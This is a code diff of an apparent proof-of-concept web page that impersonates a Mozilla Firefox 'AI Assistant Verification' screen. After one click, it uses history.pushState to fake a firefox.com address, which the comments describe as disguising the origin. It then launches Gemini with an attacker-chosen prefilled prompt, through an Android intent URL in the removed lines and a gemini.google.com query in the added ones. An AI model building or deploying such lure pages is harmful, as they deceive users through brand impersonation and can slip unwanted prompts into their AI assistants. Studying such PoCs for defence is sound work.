@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Firefox AI Gateway — One-Click Bridge</title>
+<title>Firefox AI Gateway — Web Gemini Bridge</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { 
@@ -54,9 +54,9 @@
 
 <div class="card">
   <div class="logo">Mozilla Firefox</div>
-  <h2>AI Assistant Verification</h2>
-  <p>Click below to establish a secure handshake bridge with the mobile assistant runtime.</p>
-  <button id="actionBtn">Connect & Initialize</button>
+  <h2>Web Assistant Verification</h2>
+  <p>Click below to initialize secure handoff to the web-based Gemini interface.</p>
+  <button id="actionBtn">Launch Web Gemini</button>
   <div id="status"></div>
 </div>
 
@@ -69,43 +69,42 @@
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PoC One-Click Gemini] " + msg);
+    console.log("[PoC Web Gemini] " + msg);
   }
 
-  function executeOneClickGeminiIntent() {
+  function executeWebGeminiRedirect() {
     log("[*] Stacking security context...");
 
     // 1. Manipulasi History Stack untuk menyamarkan origin (menyerupai domain firefox.com)
     try {
       if (window.history && window.history.pushState) {
-        window.history.pushState({page: "ai_bridge"}, "Firefox AI", "https://www.firefox.com/ai/verify");
+        window.history.pushState({page: "web_bridge"}, "Firefox AI", "https://www.firefox.com/ai/verify");
       }
     } catch (e) {}
 
-    // 2. Konstruksi Android Intent untuk Gemini dengan membawa teks parameter "testing"
-    var geminiPromptText = "testing";
-    var geminiIntentUrl = "intent://chat?text=" + encodeURIComponent(geminiPromptText) + "#Intent;scheme=googlebard;package=com.google.android.apps.bard;action=android.intent.action.VIEW;end;";
+    // 2. Target URL Web Gemini resmi dengan parameter query "testing"
+    var webGeminiUrl = "https://gemini.google.com/app?q=" + encodeURIComponent("testing");
 
-    log("[!] Dispatching intent payload via user gesture...");
+    log("[!] Redirecting to web interface...");
 
-    // 3. Eksekusi pengalihan yang diinisiasi langsung oleh gestur klik pengguna (memenuhi syarat User Activation / Transient Activation)
+    // 3. Eksekusi pengalihan mutlak ke browser web Gemini
     setTimeout(function() {
       try {
-        window.location.replace(geminiIntentUrl);
+        window.location.replace(webGeminiUrl);
       } catch (err) {
         log("[-] Error during redirection: " + err.message);
       }
     }, 400);
   }
 
-  // Menggunakan event klik murni (One-Click trigger)
+  // Pemicu One-Click via tombol interaktif
   btn.addEventListener('click', function() {
     btn.disabled = true;
     btn.style.opacity = "0.6";
-    log("Initializing bridge...");
+    log("Initializing web bridge...");
 
     setTimeout(function() {
-      executeOneClickGeminiIntent();
+      executeWebGeminiRedirect();
     }, 500);
 
   }, { once: true });
